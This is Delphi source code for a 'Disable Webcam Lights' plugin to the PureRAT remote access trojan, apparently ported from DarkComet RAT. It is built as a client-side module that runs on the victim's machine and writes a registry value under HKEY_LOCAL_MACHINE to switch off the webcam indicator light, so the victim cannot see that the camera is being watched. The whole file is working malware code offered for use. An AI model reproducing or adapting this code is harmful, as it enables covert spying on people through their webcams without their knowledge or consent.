library WebcamLights; //This plugin was originaly coded for DarkComet RAT, all credits go to Anonmoosekaab

uses
  Windows,
  SysUtils,
  Registry;
               
//Constants for plugin infos										
const
  //Kind of plugin you can create for PureRAT
  PluginType: array[0..2] of string = ('Client', 'Builder', 'Server'); //(*)
  
  //Main plugin infos
  PluginName = 'Disable Webcam Lights';
  PluginAuthor = 'Anonmoosekaab';
  PluginDescription = 'Disables SOME webcam lights, requires administrator rights';
  PluginVersion = '1.0.0.0';

  //[NOTE]
  
  {(*) PureRAT use a reverse connection model, so the client is the part
     installed on remote machine, the builder is the client builder on main application and
		 the server the main application itself}

//Function to retrieve plugin infos
function PluginInfos: PChar; stdcall;
begin
  Result := PChar(PluginName + '|' +
                  PluginAuthor + '|' +
                  PluginDescription + '|' +
                  PluginVersion + '|' +
                  PluginType[0] + '|'); //Specify the plugin type by index (0 -> Client)
end;
//-----

//Function to be executed
procedure PluginFunction; stdcall;
var
  R:  TRegistry;
begin
  R:= TRegistry.Create;

  try
    R.RootKey := HKEY_LOCAL_MACHINE; //All modifications in this root key requires admin rights
    R.OpenKey('SYSTEM\CurrentControlSet\Control\Class\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}\0000\Settings', True);
    R.WriteInteger('Default', 0);
  finally
    R.Free
  end;
end;
//-----

// Don't edit following lines!!
exports
  PluginInfos,    //Infos about plugin
  PluginFunction;	//Function to execute

begin
end.
 